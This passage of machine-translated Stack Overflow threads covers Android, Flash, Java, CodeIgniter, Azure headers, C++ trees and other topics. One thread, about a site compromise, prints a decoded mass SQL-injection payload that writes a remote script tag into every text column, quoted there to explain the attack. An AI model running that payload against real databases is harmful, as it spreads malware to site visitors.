        android:id="@android:id/tabs"
        android:layout_alignParentBottom="true"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" />        
</RelativeLayout>
</TabHost> 
```

这是实现了滚动视图的选项卡的代码

```
<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android" 
android:id="@+id/todayScroll" 
android:layout_height="wrap_content"
android:layout_width="fill_parent" >

<LinearLayout 
    android:layout_height="wrap_content"
    android:layout_width="fill_parent"      
    android:orientation="vertical" >

            <ExpandableListView
                android:id="@+id/ExpList"
                android:layout_height="match_parent"
                android:layout_width="match_parent"
                android:groupIndicator="@null" />   

</LinearLayout>
</ScrollView> 
```

任何关于如何让内容正确滚动而不妨碍标签的想法将不胜感激:) 谢谢。

我已经尝试了几次，但它开始变得非常令人沮丧。

编辑：这是 TabHostActivity 文件。

```
public class TabbedMainActivity extends TabActivity {
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.tab_main);

    TabHost tabHost = getTabHost();

    // Tab for todays meals
    TabSpec todaysSpec = tabHost.newTabSpec("Todays");
    //you could set icon here as well as title
    todaysSpec.setIndicator("Todays");
    Intent todaysIntent = new Intent(this, TodaysMealsActivity.class);
    todaysSpec.setContent(todaysIntent);

    // Tab for future meals
    TabSpec futureSpec = tabHost.newTabSpec("Future");
    futureSpec.setIndicator("Future");
    Intent futureIntent = new Intent(this, FutureMealsActivity.class);
    futureSpec.setContent(futureIntent);

    // Tab for comments
    TabSpec commentsSpec = tabHost.newTabSpec("Comments");
    commentsSpec.setIndicator("Feedback");
    Intent commentsIntent = new Intent(this, CommentsActivity.class);
    commentsSpec.setContent(commentsIntent);

    // Adding all TabSpec to TabHost
    tabHost.addTab(todaysSpec); // Adding todays tab
    tabHost.addTab(futureSpec); // Adding future tab
    tabHost.addTab(commentsSpec); // Adding comments tab
}
} 
```

干杯，Rmplanner

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T01:57:30.553

**从评论中编辑：在**[这里](https://stackoverflow.com/questions/5402328/how-to-show-tabs-at-bottom-rather-then-at-top)找到了另一种解决方案（OP 使用的解决方案）。

~~在`android:layout_height="fill_parent"`您的`ScrollView`. （或者，由于`fill_parent`已弃用，请使用`android:layout_height="match_parent"`.）~~

首先，删除你的`ScrollView`，并用这个替换你`RelativeLayout`的：

```
<RelativeLayout
    android:layout_height="fill_parent"
    android:layout_width="fill_parent">

    <FrameLayout
        android:id="@android:id/tabcontent"
        android:layout_above="@android:id/tabs"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:padding="5dp" />

    <TabWidget
        android:id="@android:id/tabs"
        android:layout_alignParentBottom="true"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" />

</RelativeLayout> 
```

# flash - 如何创建 2D 玻璃破碎效果？

> ID：11751603
> 
> 赞同：1
> 
> 时间：2012-08-01T01:56:55.163
> 
> 标签：flash, adobe, effect, particles, aero-glass

我正在使用 Adob​​e Flash CS6 创建游戏，游戏以动画开始，主角正在奔跑并打破玻璃花瓶。

我不想要一个完全准确的破碎玻璃效果，花瓶可能会掉在地板上并碎成多块，而是我正在寻找一种效果，玻璃在撞击时会破碎成一堆“闪闪发光的颗粒”，慢慢地消失在空气中。

有没有办法使用任何 Adob​​e 或免费使用的软件来实现这种效果？

我是动画的初学者，所以假设我什么都不知道。:D

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T02:08:25.253

**我强烈建议您研究游戏的[Starling 框架，](http://gamua.com/starling/)**这是一种艰难但最好的方法**。这确实需要大量的动作脚本，但它是构建游戏的最佳方式，该游戏将像玻璃一样流畅运行，并且能够顺利导出到 iOS/android。**

 ****最简单的方法** 将花瓶制作成影片剪辑。在第 1 帧添加停止动作。然后说第 2-10 帧是花瓶掉落动画。最后是第 11 帧——如果你愿意，你可以手动制作任何粒子动画。添加一个朝一个方向发射的发光球体，然后将该球体和动画复制到多个图层，改变图层上每个球体的方向/结束位置。您还希望将粒子动画的起点和终点错开，以使其看起来更有趣。

祝你好运。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-06T09:42:46.187

我知道这个问题现在已经过时了，但其他人可能会用谷歌搜索并找到它，所以我添加了这个答案。

您可以在 adobe flash 中采取一些简单的步骤来实现这一点，因为您不想要一个完美逼真的模拟。我解释假设 ura 100% noob:p

1.  **制作一个新的 MovieClip**符号。双击它开始编辑。
2.  **绘制对象**或导入图像并将**其跟踪到位图中**（修改 > 位图 > 跟踪位图）
3.  使用线条工具 (N)**绘制几条纯色线条**，就像您将形状分割成碎片一样。
4.  按住 shift，**选择线条之间的形状**（当您单击它们时，您正在选择其中的每个纯色部分，按住 shift，您可以选择线条之间的所有部分，因为它们将作为一个碎片一起破碎）
5.  选择整块后，右键单击它并**创建补间动画**（Flash 会自动创建一个包含您的选择的新图层，并将帧添加到该图层）
6.  只需**将片段移动到最后一个位置**（Flash 自动将该帧视为关键帧）
7.  返回到第 1 帧，对要粉碎的每一块重复步骤 4-6。
8.  返回到第 1 帧并**删除您**在第 3 步中绘制的线条。
9.  对于你所做的每一个补间动画，将它的缓动设置更改为一个正数（**缓出**- 实际上 100 是好的）你可以通过单击每个图层的任何帧并打开属性面板的缓动部分来做到这一点。

其他步骤取决于您的口味，使用位置、旋转和轻松设置，您甚至可以按照上面的指南将每一块切割成其他块。你也可以让其他图层扮演另一个角色，比如如果它是一杯咖啡，粉碎它的固体碎片并在一个新图层中绘制液体（逐帧或缩放它 - 记住将该图层发送到底部：p）。也可以考虑更改 Alpha。

在你保存你的作品之后，你知道你可以通过导入它在你的其他项目中使用相同的 MovieClip。当您将 FLA 导入到 flash 时，系统会要求您选择其中的符号。所以不要惊慌再做一次。

祝你好运**

# java - 枚举类的内存泄漏

> ID：11751614
> 
> 赞同：0
> 
> 时间：2012-08-01T01:58:43.827
> 
> 标签：java, jsp, tomcat6, memory-leaks

我们有一个常量类，它在枚举类中有一个 jsps/servlet 列表。此类从控制器 servlet 中用作重定向。这个特定的类总是在内存分析器中显示为泄漏可疑。

我在这里粘贴来自控制器 servlet 的代码：

```
 protected void forwardPage(Page jspPage, boolean checkTrail, HttpServletRequest request, HttpServletResponse response) {
 String temp;
 String str = new String();

 str = jspPage.name();

Page page1 =  Page.valueOf(Page.class,str);
    try {
        temp = page1.getFileName();
        getServletContext().getRequestDispatcher(temp).forward(request, response);  
    } catch (Exception se) {
    } finally { 
        page1 = null;
        jspPage = null;
        str = null;
        temp = null;
    } 
```

页面本身是一个枚举类，具有这样的代码..

UPDATE_PROFILE_CONFIRM("/WEB-INF/jsp/login/updateProfileConfirm.jsp", "确认您的个人资料") public String getTitle() {

```
 return this.title;
}

public String getFileName() {
    return this.fileName;
}

public void setFileName(String newFileName) {
    this.fileName = newFileName;
} 
```

我无法理解的是为什么这个类应该泄漏？一旦我删除 Page 的引用并直接重定向，问题似乎就消失了。没有框架，简单的 servlet-jsp 框架。应用程序服务器是 Tomcat 6 和 JDK 6。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T03:25:48.980

我怀疑由于枚举有 301 个值，因此该枚举的 301 个实例总是在 ram 中，这是正常的，因为这些实例静态链接到枚举类。这不是泄漏，这就是枚举的工作方式。

内存分析器只是告诉你有 13,244 个字节无法回收，这可能会显示为泄漏，但事实并非如此。奇怪的是它不知道枚举，可能根本没想到一个枚举有301个包含很多字节的值，通常枚举有几个元素，存储有限数量的值，但是有一个像这样的枚举并没有错你的“页面”。

# facebook - Facebook 注册插件中的 iframe 目标不能设置为 _self

> ID：11751617
> 
> 赞同：3
> 
> 时间：2012-08-01T01:59:14.480
> 
> 标签：facebook, iframe, registration, target

我正在尝试在我的网站上使用 iframe 版本的 Facebook 注册插件，但我遇到了重定向目标问题。

在我的网站上，页面中间有一个 iframe；当用户单击“注册”时，我希望 iframe 导航到 redirect_uri，将浏览器留在我的网站上。我的印象是，这可以通过更改“目标”属性来完成，如属性表中所述：[https ://developers.facebook.com/docs/plugins/registration/](https://developers.facebook.com/docs/plugins/registration/)

似乎默认值 target="_top" 应该导致浏览器窗口导航到 redirect_uri，而设置 target="_self" 应该只导致 iframe 导航到 redirect_uri。但是，我所做的一切似乎都无法改变这种默认行为。

这是 iframe 的代码（应用 ID 和重定向 URI 已编辑）

```
<iframe src="https://www.facebook.com/plugins/registration?
       client_id=MY_APP_ID&
       target=_self&
       redirect_uri=MY_URI&
       fields=name,birthday,gender,email"
       scrolling="auto"
       frameborder="no"
       style="border:none"
       allowTransparency="true"
       width="600"
       height="280">
</iframe> 
```

对于目标行，我也尝试过编码引号：

```
target=%22_self%22& 
```

其他一些问题解决了这个问题，但尚未得到充分回答。

在这里，错误链接无效： http: [//facebook.stackoverflow.com/questions/6105321/facebook-registration-plugin-forms-target-problem](http://facebook.stackoverflow.com/questions/6105321/facebook-registration-plugin-forms-target-problem)

在这里，没有答案： http: [//facebook.stackoverflow.com/questions/7829656/why-doesnt-the-target-attribute-work-on-the-facebook-registration-plugin](http://facebook.stackoverflow.com/questions/7829656/why-doesnt-the-target-attribute-work-on-the-facebook-registration-plugin)

在这里，一个答案表明使用预填充信息时目标属性被破坏，这没有记录并且似乎没有任何意义： http: [//facebook.stackoverflow.com/questions/7809805/facebook-registration -plugin-not-redirecting-sending-data-of-logged-in-users](http://facebook.stackoverflow.com/questions/7809805/facebook-registration-plugin-not-redirecting-sending-data-of-logged-in-users)

任何见解将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-03T14:48:13.400

您是否尝试为框架设置名称，然后引用目标中的名称？

```
<iframe name = "fbplugin" 
  src = "https://www.facebook.com/plugins/registration?
         client_id = MY_APP_ID&
         target = fbplugin&
         redirect_uri = MY_URI&
         fields = name, birthday, gender, email"
  scrolling = "auto"
  frameborder = "no"
  style = "border: none"
  allowTransparency = "true"
  width = "600"
  height = "280">
</iframe> 
```

不确定这是否有效，但值得一试。

# codeigniter - Codeigniter 动态导航

> ID：11751624
> 
> 赞同：2
> 
> 时间：2012-08-01T02:00:05.963
> 
> 标签：codeigniter, menu

我是codeigniter的新手。我正在尝试使用 mysql 数据库编写应用程序。在我的网站中，我想将菜单用作：

```
+Homepage
+About
+Services
  +Education services
  +neurofeedback
  +biofeedback 
```

我需要一些信息才能理解。我使用页面控制器作为主页控制器：

```
<?php 

class Pages extends CI_Controller {

        public function view($page = 'home')
        {$this->load->view('templates/header', $data);
        $this->load->view('pages/'.$page, $data);
        $this->load->view('templates/footer', $data); 
```

我的问题是：

1）菜单控制器必须在页面控制器内编码还是单独编码？

2）如何从数据库制作菜单控制器？

3) 我如何与菜单 ID 和页面 ID 建立关系？

我做了很多研究，但我需要更多的了解。

感谢您的帮助。

编辑：正如你所说，我使用了 MY_Controller。

这是我的页面控制器：

```
class Home extends MY_Controller {
         function __construct() {
    parent::__construct();
  }

        public function view($page = 'home')
        {
         $this->load->helper('text');
            $data['records']= $this->services_model->getAll();
            if ( ! file_exists('application/views/pages/'.$page.'.php'))
            {
                // Whoops, we don't have a page for that!
                show_404();
            }

            $data['title'] = ucfirst($page); // Capitalize the first letter

            $this->load->view('pages/'.$page, $data);

        }

} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T03:15:06.727

> 菜单控制器必须在页面控制器内编码还是单独编码？

假设你有一个所有页面都必须遵循的模板，我建议你这样做。

**1.创建基本控制器**

在 ./application/core/ 文件夹中，创建一个名为 MY_Controller 的文件

```
class MY_Controller extends CI_Controller {

  protected $data = array();

  function __construct() {
    parent::__construct();
  }

  function render_page($view) {
    //do this to don't repeat in all controllers...
    $this->load->view('templates/header', $this->data);
    //menu_data must contain the structure of the menu...
    //you can populate it from database or helper
    $this->load->view('templates/menu', $menu_data);
    $this->load->view($view, $this->data);
    $this->load->view('templates/footer', $this->data);
  }

} 
```

**2.每个页面创建一个控制器，使用MY_Controller代替CI_Controller**

```
class Homepage extends MY_Controller {
  function __construct() {
    parent::__construct();
  }

  function index() {
    //define data that the view can access
    $this->data['someDataToView'] = 'Some data';
    $this->render_page('pages/homepage');
  }

} 
```

> 如何从数据库制作菜单控制器？

好吧，你不会有菜单的控制器，而是一个视图。

**菜单的可能性**

1.  为菜单创建一个视图，在 MY_Controller 中从数据库中加载记录，在 中加载视图`render_page()`；
2.  为菜单创建一个视图，在 MY_Controller 中创建一个定义菜单结构和使用的[Helper](http://codeigniter.com/user_guide/general/helpers.html)`render_page()`函数，在 中加载视图；

**菜单模板示例（根据您的情况进行调整）：**

./application/views/templates/menu.php

```
<ul>
<?php foreach($menus as $menu): ?>
  <li><a href='<?php print $menu["url"] ?>'><?php print $menu["title"] ?></a></li>
<?php endforeach; ?>
</ul> 
```

**编辑**

鉴于您的 Home 控制器，我认为错误在您的 file_exists 检查中。查看我更改的 Home 控制器：

```
class Home extends MY_Controller {
  function __construct() {
    parent::__construct();
  }

   public function view($page = 'home') {
     $this->load->helper('text');
     //always use $this->data
     $this->data['records']= $this->services_model->getAll();
     if ( ! file_exists(APPPATH.'views/pages/'.$page.'.php'))
     {
       //check the content of APPPATH.'views/pages/'.$page.'.php'
       // Whoops, we don't have a page for that!
       show_404();
     }

     $this->data['title'] = ucfirst($page); // Capitalize the first letter

     //if you use the MY_Controller, check the render_page function...
     //$this->load->view('pages/'.$page, $data);
     $this->render_page('pages/'.$page)
   }
} 
```

# python - tilestache Provider() 图层对象？可以获取引用URL吗？

> ID：11751628
> 
> 赞同：1
> 
> 时间：2012-08-01T02:00:26.770
> 
> 标签：python, tilestache

按照[此处](https://github.com/zain/pycon2012/blob/master/maps/tileserver/provider.py)的示例，我正在尝试使用tilestache创建一个用于显示的图层。有没有办法获得引用网址？

我似乎找不到任何关于该`layer`对象是什么的文档。我怀疑这个对象中可能有一些我可以使用的东西......

```
class BaselineLayerProvider(object):
    def __init__(self, layer, *args, **kwargs):
        self.layer = layer
        self.provider = ModestMaps.OpenStreetMap.Provider()                

    def renderArea(self, width, height, srs, xmin, ymin, xmax, ymax, zoom):
        print self.layer
        print dir(self.layer)

        # first, figure out the bounding box of the tile we're rendering
        nw = self.layer.projection.projLocation(ModestMaps.Core.Point(xmin, ymin))
        se = self.layer.projection.projLocation(ModestMaps.Core.Point(xmax, ymax))
        max_lat = max(nw.lat, se.lat)
        min_lat = min(nw.lat, se.lat)
        max_lon = max(nw.lon, se.lon)
        min_lon = min(nw.lon, se.lon)

        bbox = Polygon.from_bbox((min_lon, min_lat, max_lon, max_lat))
        ... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T17:50:26.530

层对象在这里描述：http: [//tilestache.org/doc/#layers](http://tilestache.org/doc/#layers)

我还没有提供获取 HTTP 引用的方法。如果您需要添加此功能，您可以创建和使用您自己的备用 WSGI 服务器。我们在 Tilestache 源码中有一些这样的例子，比如这个例子：

[https://github.com/migurski/TileStache/blob/master/TileStache/Goodies/ExternalConfigServer.py](https://github.com/migurski/TileStache/blob/master/TileStache/Goodies/ExternalConfigServer.py)

# c - 使用 mac osx 和 c 的硬件信息

> ID：11751629
> 
> 赞同：0
> 
> 时间：2012-08-01T02:00:34.610
> 
> 标签：c, macos, hardware

我知道有一个 system_profiler 命令可以在 mac 上返回信息，我还看到有人提到该命令的源代码尚未公开。

考虑到代码只能用 C 语言编写，如何找到这些信息？我想尽可能多地使用代码进行检索，而不是调用命令并解析其输出。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:20:49.547

sysctl() 函数可能会为您提供所需的信息。

在您的终端类型中

```
man -s3 sysctl 
```

# sql-injection - 搜索 SQL 注入日志

> ID：11751636
> 
> 赞同：1
> 
> 时间：2012-08-01T02:01:34.400
> 
> 标签：sql-injection

似乎有一个`<script src="http://xinthesidersdown.com">`被注入客户端服务器，我检查了日志以查看它被注入的位置和方式。不幸的是，当我搜索`xinthesidersdown`它是否被注入时，我没有看到它显示任何结果。有没有人有任何建议来找出入侵者是如何进入并将此代码注入数据库的？谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T07:47:49.847

我也有同样的问题。

我们之前已经进行了几次数据库注入 - 但由于用 ADODB 命令执行替换了正常的打开记录集，我们能够阻止它们：

例子：

**前：**

```
szSQL = "SELECT ...."
adoRstM.CursorLocation = adUseClient
adoRstM.CursorType = adOpenStatic
adoRstM.LockType = adLockBatchOptimistic
adoRstM.Open szSQL, adoCon 
```

**现在**

```
Set objCommand = Server.CreateObject("ADODB.COMMAND")
Set objCommand.ActiveConnection = adoCon
objCommand.CommandText = szSQL
objCommand.CommandType = adCmdText
Set param1 = objCommand.CreateParameter ("nMenu", adInteger, adParamInput)
param1.value = Cint(nMenu)
objCommand.Parameters.Append param1
Set param1 = objCommand.CreateParameter ("nSubMenu", adInteger, adParamInput)
param1.value = Cint(nSubMenu)
objCommand.Parameters.Append param1
Set adoRstM = objCommand.Execute() 
```

但是我们不得不到处更换它！

我现在正在查看我们的网站——如果我们可能错过了一个。也许这可以帮助你...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T08:22:34.040

在您的日志条目中查找单词“CAST”...

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-01T10:37:04.450

为了详细说明 Einav 的回答（我和她一起工作），注入有效负载通过使用 CAST 函数将十六进制格式有效负载转换为实际的恶意查询字符串进行混淆，然后由 SQL exec 命令执行。通用注入格式可以在 [这里](http://brakertech.com/decoding-sql-injection-attempts/)看到。

在这种情况下，特定的有效负载转换为：

```
set ansi_warnings off DECLARE @T VARCHAR(255),@C VARCHAR(255) DECLARE Table_Cursor CURSOR FOR select c.TABLE_NAME,c.COLUMN_NAME from INFORMATION_SCHEMA.columns c, INFORMATION_SCHEMA.tables t where c.DATA_TYPE in ('nvarchar','varchar','ntext','text') and c.CHARACTER_MAXIMUM_LENGTH>30 and t.table_name=c.table_name and t.table_type='BASE TABLE' OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN EXEC('UPDATE ['+@T+'] SET ['+@C+']=''"></title><script src="http://xinthesidersdown.com/sl.php"></script><!--''+RTRIM(CONVERT(VARCHAR(6000),['+@C+'])) where LEFT(RTRIM(CONVERT(VARCHAR(6000),['+@C+'])),17)<>''"></title><script'' ') FETCH NEXT FROM Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor 
```

希望有帮助。

# telerik - 使用 Telerik Grid 绑定到 Lightswitch 中的 ChoiceList 显示名称

> ID：11751638
> 
> 赞同：0
> 
> 时间：2012-08-01T02:01:59.237
> 
> 标签：telerik, visual-studio-lightswitch, radgridview

我已经用最新的 Telerik Silverlight RadGridView 控件交换了核心 Lightswitch 2011 数据网格控件。

根据他们的教程，我按照正常方式绑定网格列。

然而，在核心 Lightswitch 数据网格中，如果您绑定到一个选择列表的字符串字段（例如 Project Status - Value = 1, DisplayName = "In Progress"），那么它会自动显示显示名称（例如 "IN Progress"）。

但在 Telerik RadGridView 中，它显示的是 VALUE，而不是 DisplayName（例如上面示例中的 1）。

这是我在 XAML 客户控件中使用的 DataMemberBinding 表达式：

我假设核心 Lightswitch DataGrid 以某种方式从查询中获取它 - 我假设它类似于 Binding ProjectStatus.DisplayName 但这不起作用......（见截图）

![在此处输入图像描述](../Images/ed74c71388830b66388fb901f544d84c.png)

```
 <telerik:GridViewDataColumn  ShowColumnWhenGrouped="False"
                                     Width="SizeToHeader"
                                     CellStyle="{StaticResource FormLabelValueTextStyle}"
                                     DataMemberBinding="{Binding ProjectStatus}">
            <telerik:GridViewDataColumn.Header>
                <TextBlock Style="{StaticResource HeaderCellTextBlockStyle}"
                           Text="Project Status" />
            </telerik:GridViewDataColumn.Header>
        </telerik:GridViewDataColumn>

    </telerik:RadGridView.Columns>
</Controls:RadGridView> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T22:36:04.983

*选择列表*是一个 LightSwitch 概念，它们存储在 lsml 文件中（我不使用它们的原因之一），所以如果您使用非 LS 数据网格，它不可用我并不感到惊讶。

解决这个问题的方法是使用实​​际的查找*表*而不是*选择列表*。然后您就可以绑定到实体的属性。

# android - 光标与 Jellybean 不一样？

> ID：11751639
> 
> 赞同：0
> 
> 时间：2012-08-01T02:02:01.297
> 
> 标签：android, sqlite, cursor

我正在处理一些从数据库中获取名称和编号并显示它的代码。该代码适用于运行 1.6 的模拟器，但不适用于运行 4.1.1 的 Galaxy Nexus。

每当我在设备上调用 viewEntries() 时，我的应用程序强制关闭并给出 IllegalStateException 无法找到该列。WhitelistDB 扩展自 SQLiteOpenHelper。

感谢您的任何帮助。

```
public String getData()
{
    WhitelistDB DB = new WhitelistDB(this);
    SQLiteDatabase db = DB.getReadableDatabase();

    String[] columns = new String[]{WhitelistDB.KEY_ID, WhitelistDB.KEY_NAME, WhitelistDB.KEY_NUMBER};
    Cursor c = db.query(WhitelistDB.TABLE_NAME, columns, null, null, null, null, null);
    String result = "";

    int count = c.getColumnCount();
    String noEntries = "No entries in whitelist.";

    if(count < 1)
    {
        return noEntries;
    }

    int iRow = c.getColumnIndex(WhitelistDB.KEY_ID);
    int iName = c.getColumnIndex(WhitelistDB.KEY_NAME);
    int iNumber = c.getColumnIndex(WhitelistDB.KEY_NUMBER);

    for(c.moveToFirst(); !c.isAfterLast(); c.moveToNext())
    {
        result = result + c.getString(iRow) + " " + c.getString(iName) + " " + c.getString(iNumber) + "\n";
    }

    db.close();

    return result;
}

public void viewEntries()
{
    TextView tv = (TextView) findViewById(R.id.wlData);
    String info = getData();
    tv.setText(info);
} 
```

这是我得到的错误。

```
07-31 18:42:10.706: E/CursorWindow(10024): Failed to read row 0, column -1 from a CursorWindow which has 7 rows, 3 columns.
07-31 18:42:10.706: D/AndroidRuntime(10024): Shutting down VM
07-31 18:42:10.706: W/dalvikvm(10024): threadid=1: thread exiting with uncaught exception (group=0x41dbe300)
07-31 18:42:10.714: E/AndroidRuntime(10024): FATAL EXCEPTION: main
07-31 18:42:10.714: E/AndroidRuntime(10024): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.mutoor.autoreply/com.mutoor.autoreply.WhitelistActivity}: java.lang.IllegalStateException: Couldn't read row 0, col -1 from CursorWindow.  Make sure the Cursor is initialized correctly before accessing data from it.
07-31 18:42:10.714: E/AndroidRuntime(10024):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2059) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T03:04:57.487

尝试清除以前安装的数据：

`Settings`--> `Apps`--> `[app name]`-->`Clear data`

# security - Azure webrole 过多的标头

> ID：11751644
> 
> 赞同：0
> 
> 时间：2012-08-01T02:02:41.357
> 
> 标签：security, azure, http-headers, azure-web-roles

我有一个在 Azure Web Roles 中运行的网站。我针对 asafaweb.com 对该站点进行了测试，并收到了“过多的标题”警告。

![asafaweb.com 截图](../Images/e909b43f970c074d1b9fca2f07a9fb8f.png)

基本上，Azure 会发送 IIS 版本和 .net 版本作为标头的一部分。

有很多关于如何在 IIS 中关闭这些标头的信息，但是如何在 Azure 中关闭它们？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T03:48:29.250

这是我在大多数项目中用来隐藏这些标题的方法：

**Global.asax.cs**（仅适用于 MVC 项目）

```
protected void Application_Start()
{
    MvcHandler.DisableMvcResponseHeader = true;
} 
```

**自定义 HttpModule**

```
public class RemoveHeadersHttpModule : IHttpModule
{
    public void Init(HttpApplication context)
    {
        context.PreSendRequestHeaders += OnPreSendRequestHeaders;
    }

    private void OnPreSendRequestHeaders(object sender, EventArgs e)
    {
        HttpContext.Current.Response.Headers.Remove("Server");
        HttpContext.Current.Response.Headers.Remove("X-AspNet-Version");
    }

    public void Dispose()
    {

    }
} 
```

**网络配置**

```
 <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="Server" />
        <remove name="X-Powered-By" />
      </customHeaders>
    </httpProtocol>

    <modules runAllManagedModulesForAllRequests="true">
      . . .
      <add name="RemoveHeadersHttpModule" type="MyNamespace.RemoveHeadersHttpModule"/>
    </modules>

    . . . 
  </system.webServer> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-09T16:58:26.197

如果您想要一个完整的解决方案来删除**Azure**上的所有多余标头，该解决方案也适用于 Cassini，而无需使用自定义 HttpModule，请参见此处：

[在没有 UrlScan 的情况下删除/隐藏/禁用 Azure/IIS7 中过多的 HTTP 响应标头](https://stackoverflow.com/questions/12803972/removing-hiding-disabling-excessive-http-response-headers-in-azure-iis7-without)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T02:17:47.477

Windows Azure Web 角色本质上是启用了 IIS 的 Windows Server 2008。因此，如果您想定制 IIS，您可以使用启动脚本并调用 appcmd 来更改您想要的设置（或以您通常使用的任何其他方式对其进行操作）。您的脚本将类似于：

`%windir%\system32\inetsrv\appcmd set ...`

# html - Mac OSX 上的 Chrome 在基本拉丁块中呈现字体

> ID：11751645
> 
> 赞同：1
> 
> 时间：2012-08-01T02:02:48.300
> 
> 标签：html, css, fonts, font-face

问题是 Mac OSX 上的 Chrome 似乎在基本拉丁块中呈现类型。我确实有一个使用 font-face 的 IE 条件样式表，但是我没有将 font-face 用于 IE 以外的任何东西。我猜这可能是内部系统字体问题（错误不在我自己的系统上），但我想确定一下。

这是我的这段文字的CSS：

```
@font-face {
    font-family: HelveticaNeue-Bold;
    src: url('type/helveticaneue/helveticaneue-bold.eot');
    src: local('☺'), url('type/helveticaneue/helveticaneue-bold.eot?#iefix') format('embedded-opentype'),
         url('type/helveticaneue/helveticaneue-bold.woff') format('woff'),
         url('type/helveticaneue/helveticaneue-bold.ttf') format('truetype'),
         url('type/helveticaneue/helveticaneue-bold.svg#helveticaneue-bold') format('svg');
    font-weight: normal;
    font-style: normal;
}

#Text {
    font-family: 'HelveticaNeue-Bold', Helvetica Neue, Helvetica, Arial, sans-serif!important;
    font-weight: 700;
} 
```

这是 IE 条件样式表中的 CSS：

```
#Text {
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    display: inline-block;
    width: 670px;
    margin: 0 0 54px 0;
    color: #c1c1c1;
} 
```

文本如下所示：

![块中的 Chrome 渲染类型](../Images/cb4812b2142b0f05a2d0e94b1d865cfa.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T10:47:02.280

2012 年 4 月：

> 希望 Google Chrome 开发团队正在为此努力解决问题，但不幸的是，据我研究这个问题，这个问题已经存在一年多了，虽然它不影响 Firefox、Safari 或 Opera ，Chrome 团队的工作似乎没有任何修复。

来源： [http ://www.jonathanjeter.com/web-development/browsers/google-chrome-mac-system-font-manager-problem/](http://www.jonathanjeter.com/web-development/browsers/google-chrome-mac-system-font-manager-problem/)

# c++ - 按名称遍历树c ++

> ID：11751646
> 
> 赞同：0
> 
> 时间：2012-08-01T02:02:49.757
> 
> 标签：c++, binary-tree, traversal

几个小时以来，我一直在用头撞墙。我不知道该怎么做。我已经多次重组了我的功能，但仍然没有让它正常工作。

这是我的 c++ 课程中的编程作业。它必须有一个特定的形式，如数据类型、参数等，由讲师给出，所以我不能改变任何类似的东西。我们必须使用字符数组，因此使用 strcmp()。如果我们找到它，我们必须返回这个人，如果我们没有找到它，则返回 NULL。

这是我目前正在使用的内容：

```
person *classname::getPersonByName(char *name, person *rt)
{
    if (rt != NULL)
    {
        if (strcmp(rt->Title, title) == 0)
        {
            return rt;
        }
        else
        {
            getPersonByName(title, rt->left);
            getPersonByName(title, rt->right);
            //return NULL;
        }
    }
} 
```

在调试中，它会按名称找到并返回该人。问题是，它会立即覆盖我的回报，因此不会以正确的人结束。

被注释掉的底部的 NULL 最终将每次调用都设置为 NULL，无论搜索是否找到它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T02:10:01.227

为了使递归起作用，您需要返回从函数调用中获得的值。此外，您似乎正在将标题与名称混合在一起。

```
person * foundPerson = NULL;

else
{

     foundPerson = getPersonByName(title, rt->left);
     if(foundPerson != NULL) return foundPerson;
     return getPersonByName(title, rt->right);
     //return NULL;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T02:13:55.120

问题是，您没有从递归调用中返回任何内容。

这个想法其实并不难，只需翻译这个伪代码：

```
// This is mostly a procedural way from your method signature, though you are using C++...
Node getPersonByName(Node node, String name) {
    if (node is null) {
        return null
    }

    if (node.name == name) {
        return Node
    } 

    Node result = getPersonByName(node.left, name);
    if (result is not null) {  // found in node.left
        return result;
    }

    result = getPersonByName(node.right, name);
    if (result is not null) {  // found in node.right
        return result;
    }

    return null;
} 
```

我将把它作为作业留给你把它翻译成 C/C++，并通过避免多个返回点使结构看起来更好

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T02:10:48.707

应该是这样的（首先，与您传递的名称进行比较（我假设这是您想要做的，其次，您的递归写错了，当递归左右子树时，`Person*`将返回给父调用函数，你也必须把它放在那里。）：

```
person *classname::getPersonByName(char *name, person *rt)
{
    if (rt == NULL)
        return NULL;
    if (strcmp(rt->Title, name) == 0)
    {
        return rt;
    }
    Person *left = getPersonByName(name, rt->left);
    if(left!=NULL )
        return left;
    Person *right = getPersonByName(name, rt->right);
    if(right!=NULL)
            return right;
    return NULL;
 } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T02:10:23.393

您正在传递`title`递归调用和字符串测试。你不应该使用`name`吗？我假设这`title`是当前节点的名称。

上课是`classname`为了什么？你肯定会做类似的事情：

```
person * person::findByName( char *name ); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-02T00:35:18.937

